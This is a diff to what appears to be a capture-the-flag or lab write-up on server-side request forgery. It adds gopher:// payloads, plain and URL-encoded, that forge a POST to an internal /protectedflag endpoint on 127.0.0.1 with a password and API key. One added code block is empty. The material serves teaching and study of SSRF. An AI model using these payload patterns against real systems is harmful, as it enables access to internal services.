@@ -189,6 +189,18 @@ gopher%253A%252F%252F127.0.0.1:80/_GET%20/protectedflag%20HTTP/1.1%0apassword%25
 gopher://127.0.0.1:80/_POST%20/protectedflag%20HTTP/1.1%0apassword%253Dtwasbryllyg%0aapiKey%253chesirecat
 ```
 
+```shell
+gopher://127.0.0.1:80/_POST /protectedflag HTTP/1.1\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 39\r\n\r\npassword=twasbryllyg&apiKey=chesirecat
+```
+
+```shell
+gopher%3A%2F%2F127.0.0.1%3A80%2F_POST%20%2Fprotectedflag%20HTTP%2F1.1%5CnHost%3A%20127.0.0.1%5Cr%5CnContent-Type%3A%20application%2Fx-www-form-urlencoded%5Cr%5CnContent-Length%3A%2039%5Cr%5Cn%5Cr%5Cnpassword%3Dtwasbryllyg%26apiKey%3Dchesirecat
+```
+
+```shell
+
+```
+
 ---
 
 #### 📬 Client Request Headers
